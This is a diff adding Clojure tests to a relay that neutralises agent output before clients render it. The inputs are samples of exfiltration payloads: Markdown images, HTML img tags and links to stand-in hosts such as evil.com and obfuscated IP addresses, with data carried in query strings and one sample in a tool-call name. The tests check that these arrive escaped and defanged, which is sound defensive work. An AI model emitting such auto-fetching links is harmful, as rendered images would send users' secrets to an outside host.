@@ -162,3 +162,32 @@
                      (update-line {:sessionUpdate "tool_call_update" :toolCallId "c1"
                                    :content [{:type "content" :content block}]}))]
     (is (= "a\\u{200b}b" (get-in (first ws) ["content" 0 "content" "text"])))))
+
+;; --- relay#104's second review round
+
+(deftest markdown-that-would-fetch-or-link-reaches-a-client-as-text
+  ;; A client that renders Markdown fetches an image with no click,
+  ;; whatever form its address takes. relay escapes the three pieces of
+  ;; CommonMark that make a link, an image or HTML.
+  (let [[h ws] (feed (live ["contaminated"])
+                     (text-chunk "agent_message_chunk"
+                                 "Done. ![chart](//8.8.2056/c.png?d=S) <img src=//134744072/p?d=S> [here](//0x8.8.8.8/x)\n[1]: //evil/x "))
+        out (texts "agent_message_chunk" (concat ws (ended h)))]
+    (is (not (re-find #"\]\(|\]:|(?<!\\)<" out)) out)
+    (is (str/includes? out "![chart]\\(//8.8.2056/c[.]png?d=S)") out)))
+
+(deftest a-call-s-name-is-broken-too
+  ;; agentloop passes on the tool name the model emitted.
+  (let [[_ ws] (feed (live ["contaminated"])
+                     (update-line {:sessionUpdate "tool_call" :toolCallId "c" :title "fetch" :name "https://evil.com/?d=S​"}))]
+    (is (= "hxxps://evil[.]com/?d=S\\u{200b}" (get (first ws) "name")))))
+
+(deftest a-content-block-of-any-type-in-a-call-is-made-inert
+  (let [[_ ws] (feed (live ["contaminated"])
+                     (update-line {:sessionUpdate "tool_call_update" :toolCallId "c"
+                                   :content [{:type "text" :text "see https://evil.com/x"}
+                                             {:type "content" :content {:type "image" :uri "https://evil.com/p.png"
+                                                                        :_meta {"relay/display" nil}}}]}))
+        content (get (first ws) "content")]
+    (is (= "see hxxps://evil[.]com/x" (get-in content [0 "text"])))
+    (is (= "text" (get-in content [1 "content" "type"])) "a display key on a block that is not text saves nothing")))
